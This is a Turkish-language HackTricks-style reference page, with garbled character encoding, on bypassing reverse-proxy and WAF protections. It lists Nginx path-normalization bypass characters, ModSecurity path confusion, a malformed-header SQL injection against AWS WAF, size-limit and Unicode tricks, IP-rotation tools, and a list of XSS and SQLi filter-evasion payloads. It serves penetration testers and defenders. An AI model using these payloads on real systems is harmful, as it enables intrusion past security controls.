# Proxy / WAF Protections Bypass

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Pathname ManipÃ¼lasyonu ile Nginx ACL KurallarÄ±nÄ± Bypass Etme <a href="#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" id="heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules"></a>

Bu araÅŸtÄ±rmadan [teknikler](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

Nginx kural Ã¶rneÄŸi:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
Nginx, atlatmalarÄ± Ã¶nlemek iÃ§in kontrol etmeden Ã¶nce yol normalizasyonu yapar. Ancak, arka uÃ§ sunucusu farklÄ± bir normalizasyon gerÃ§ekleÅŸtirirse (nginx'in kaldÄ±rmadÄ±ÄŸÄ± karakterleri kaldÄ±rma), bu savunmayÄ± aÅŸmak mÃ¼mkÃ¼n olabilir.

### **NodeJS - Express**

| Nginx Versiyonu | **Node.js Atlatma Karakterleri** |
| --------------- | --------------------------------- |
| 1.22.0          | `\xA0`                            |
| 1.21.6          | `\xA0`                            |
| 1.20.2          | `\xA0`, `\x09`, `\x0C`            |
| 1.18.0          | `\xA0`, `\x09`, `\x0C`            |
| 1.16.1          | `\xA0`, `\x09`, `\x0C`            |

### **Flask**

| Nginx Versiyonu | **Flask Atlatma Karakterleri**                                   |
| --------------- | --------------------------------------------------------------- |
| 1.22.0          | `\x85`, `\xA0`                                                  |
| 1.21.6          | `\x85`, `\xA0`                                                  |
| 1.20.2          | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.18.0          | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.16.1          | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |

### **Spring Boot**

| Nginx Versiyonu | **Spring Boot Atlatma Karakterleri** |
| --------------- | ------------------------------------ |
| 1.22.0          | `;`                                  |
| 1.21.6          | `;`                                  |
| 1.20.2          | `\x09`, `;`                          |
| 1.18.0          | `\x09`, `;`                          |
| 1.16.1          | `\x09`, `;`                          |

### **PHP-FPM**

Nginx FPM yapÄ±landÄ±rmasÄ±:
```plaintext
location = /admin.php {
deny all;
}

location ~ \.php$ {
include snippets/fastcgi-php.conf;
fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```
Nginx, `/admin.php` eriÅŸimini engelleyecek ÅŸekilde yapÄ±landÄ±rÄ±lmÄ±ÅŸtÄ±r, ancak bu, `/admin.php/index.php` eriÅŸilerek aÅŸÄ±labilir.

### NasÄ±l Ã¶nlenir
```plaintext
location ~* ^/admin {
deny all;
}
```
## Mod Security KurallarÄ±nÄ± Bypass Etme <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Yol KarÄ±ÅŸÄ±klÄ±ÄŸÄ±

[**Bu yazÄ±da**](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/) ModSecurity v3'Ã¼n (3.0.12'ye kadar) eriÅŸilen yolu (parametrelerin baÅŸlangÄ±cÄ±na kadar) iÃ§ermesi gereken `REQUEST_FILENAME` deÄŸiÅŸkenini **yanlÄ±ÅŸ bir ÅŸekilde uyguladÄ±ÄŸÄ±** aÃ§Ä±klanmaktadÄ±r. Bunun nedeni, yolu almak iÃ§in bir URL Ã§Ã¶zÃ¼mlemesi yapmasÄ±dÄ±r.\
Bu nedenle, mod gÃ¼venliÄŸinde `http://example.com/foo%3f';alert(1);foo=` gibi bir istek, yolun sadece `/foo` olduÄŸunu varsayacaktÄ±r Ã§Ã¼nkÃ¼ `%3f` `?`'ye dÃ¶nÃ¼ÅŸtÃ¼rÃ¼lerek URL yolunu sonlandÄ±rÄ±r, ancak aslÄ±nda sunucunun alacaÄŸÄ± yol `/foo%3f';alert(1);foo=` olacaktÄ±r.

`REQUEST_BASENAME` ve `PATH_INFO` deÄŸiÅŸkenleri de bu hatadan etkilenmiÅŸtir.

Mod Security'nin 2. versiyonunda benzer bir durum meydana gelmiÅŸ ve yedek dosyalarla ilgili belirli uzantÄ±lara sahip dosyalara eriÅŸimi engelleyen bir korumayÄ± aÅŸmayÄ± mÃ¼mkÃ¼n kÄ±lmÄ±ÅŸtÄ±r (Ã¶rneÄŸin, `.bak` gibi) sadece noktayÄ± `%2e` ile URL kodlayarak gÃ¶ndererek, Ã¶rneÄŸin: `https://example.com/backup%2ebak`.

## AWS WAF ACL'yi Bypass Etme <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Bozuk BaÅŸlÄ±k

[Bu araÅŸtÄ±rma](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies), AWS'nin dÃ¼zgÃ¼n bir ÅŸekilde ayrÄ±ÅŸtÄ±rmadÄ±ÄŸÄ± ancak arka uÃ§ sunucusu tarafÄ±ndan ayrÄ±ÅŸtÄ±rÄ±lan "bozuk" bir baÅŸlÄ±k gÃ¶ndererek AWS WAF kurallarÄ±nÄ± aÅŸmanÄ±n mÃ¼mkÃ¼n olduÄŸunu belirtmektedir.

Ã–rneÄŸin, X-Query baÅŸlÄ±ÄŸÄ±nda bir SQL enjeksiyonu ile aÅŸaÄŸÄ±daki isteÄŸi gÃ¶ndermek:
```http
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```
AWS WAF'Ä± atlatmak mÃ¼mkÃ¼ndÃ¼ Ã§Ã¼nkÃ¼ bir sonraki satÄ±rÄ±n baÅŸlÄ±ÄŸÄ±n deÄŸeriyle ilgili olduÄŸunu anlamÄ±yordu, oysa NODEJS sunucusu anlÄ±yordu (bu dÃ¼zeltildi).

## Genel WAF atlatmalarÄ±

### Ä°stek Boyutu SÄ±nÄ±rlarÄ±

Genellikle WAF'lar, kontrol etmek iÃ§in belirli bir istek uzunluÄŸu sÄ±nÄ±rÄ±na sahiptir ve eÄŸer bir POST/PUT/PATCH isteÄŸi bu sÄ±nÄ±rÄ± aÅŸarsa, WAF isteÄŸi kontrol etmez.

* AWS WAF iÃ§in [**belgelere gÃ¶z atabilirsiniz**](https://docs.aws.amazon.com/waf/latest/developerguide/limits.html)**:**

<table data-header-hidden><thead><tr><th width="687"></th><th></th></tr></thead><tbody><tr><td>Uygulama YÃ¼k Dengeleyici ve AWS AppSync korumalarÄ± iÃ§in incelenebilecek maksimum web istek gÃ¶vde boyutu</td><td>8 KB</td></tr><tr><td>CloudFront, API Gateway, Amazon Cognito, App Runner ve DoÄŸrulanmÄ±ÅŸ EriÅŸim korumalarÄ± iÃ§in incelenebilecek maksimum web istek gÃ¶vde boyutu**</td><td>64 KB</td></tr></tbody></table>

* [**Azure belgelerinden**](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-request-size-limits)**:**

Eski Web Uygulama GÃ¼venlik DuvarlarÄ±, Core Rule Set 3.1 (veya daha dÃ¼ÅŸÃ¼k) ile **128 KB**'dan bÃ¼yÃ¼k mesajlara izin verir, ancak bu mesajlar zafiyetler iÃ§in kontrol edilmeyecektir. Daha yeni sÃ¼rÃ¼mler (Core Rule Set 3.2 veya daha yenisi) iÃ§in, maksimum istek gÃ¶vde sÄ±nÄ±rÄ±nÄ± devre dÄ±ÅŸÄ± bÄ±rakarak aynÄ± ÅŸey yapÄ±labilir. Bir istek boyut sÄ±nÄ±rÄ±nÄ± aÅŸarsa:

EÄŸer **Ã¶nleme modu**: Ä°steÄŸi kaydeder ve engeller.\
EÄŸer **tespit modu**: SÄ±nÄ±r kadar inceler, geri kalanÄ±nÄ± gÃ¶z ardÄ± eder ve `Content-Length` sÄ±nÄ±rÄ± aÅŸarsa kaydeder.

* [**Akamai'den**](https://community.akamai.com/customers/s/article/Can-WAF-inspect-all-arguments-and-values-in-request-body?language=en_US)**:**

VarsayÄ±lan olarak, WAF yalnÄ±zca bir isteÄŸin ilk 8KB'sini inceler. GeliÅŸmiÅŸ Meta Veriler ekleyerek sÄ±nÄ±rÄ± 128KB'a kadar artÄ±rabilir.

* [**Cloudflare'dan**](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#http-request-body-fields)**:**

128KB'a kadar.

### Obfuscation <a href="#obfuscation" id="obfuscation"></a>
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
### Unicode UyumluluÄŸu <a href="#unicode-compatability" id="unicode-compatability"></a>

Unicode normalizasyonunun uygulanmasÄ±na baÄŸlÄ± olarak (daha fazla bilgi [burada](https://jlajara.gitlab.io/Bypass\_WAF\_Unicode)), Unicode uyumluluÄŸunu paylaÅŸan karakterler WAF'Ä± atlayabilir ve amaÃ§lanan yÃ¼k olarak Ã§alÄ±ÅŸtÄ±rÄ±labilir. Uyumlu karakterler [burada](https://www.compart.com/en/unicode) bulunabilir.

#### Ã–rnek <a href="#example" id="example"></a>
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
ï¼œimg srcâ¼p onerrorâ¼ï¼‡promptâ½1â¾ï¼‡ï¹¥  --> ï¼œimg src=p onerror='prompt(1)'>
```
### H2C Smuggling <a href="#ip-rotation" id="ip-rotation"></a>

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

### IP Rotation <a href="#ip-rotation" id="ip-rotation"></a>

* [https://github.com/ustayready/fireprox](https://github.com/ustayready/fireprox): ffuf ile kullanÄ±lmak Ã¼zere bir API geÃ§idi URL'si oluÅŸturur
* [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin): fireprox'a benzer
* [https://github.com/PortSwigger/ip-rotate](https://github.com/PortSwigger/ip-rotate): API geÃ§idi IP'lerini kullanan Burp Suite eklentisi
* [https://github.com/fyoorer/ShadowClone](https://github.com/fyoorer/ShadowClone): Girdi dosyasÄ± boyutuna ve bÃ¶lme faktÃ¶rÃ¼ne dayalÄ± olarak dinamik olarak belirlenen bir dizi konteyner Ã¶rneÄŸi etkinleÅŸtirilir; girdi, paralel yÃ¼rÃ¼tme iÃ§in parÃ§alara ayrÄ±lÄ±r, Ã¶rneÄŸin 10,000 satÄ±rlÄ±k bir girdi dosyasÄ±ndan 100 satÄ±rlÄ±k bir bÃ¶lme faktÃ¶rÃ¼ ile 100 parÃ§ayÄ± iÅŸleyen 100 Ã¶rnek.

### Regex Bypasses

FarklÄ± teknikler, gÃ¼venlik duvarlarÄ±ndaki regex filtrelerini atlatmak iÃ§in kullanÄ±labilir. Ã–rnekler arasÄ±nda bÃ¼yÃ¼k/kÃ¼Ã§Ã¼k harf deÄŸiÅŸtirme, satÄ±r sonlarÄ± ekleme ve yÃ¼kleri kodlama yer alÄ±r. Ã‡eÅŸitli atlatma kaynaklarÄ± [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads) ve [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS\_Filter\_Evasion\_Cheat\_Sheet.html) adreslerinde bulunabilir. AÅŸaÄŸÄ±daki Ã¶rnekler [bu makaleden](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2) alÄ±nmÄ±ÅŸtÄ±r.
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## AraÃ§lar

* [**nowafpls**](https://github.com/assetnote/nowafpls): WAF'larÄ± uzunlukla atlatmak iÃ§in isteklere gereksiz veri ekleyen Burp eklentisi

## Referanslar

* [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
* [https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)
* [https://www.youtube.com/watch?v=0OMmWtU2Y\_g](https://www.youtube.com/watch?v=0OMmWtU2Y\_g)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** bizi takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
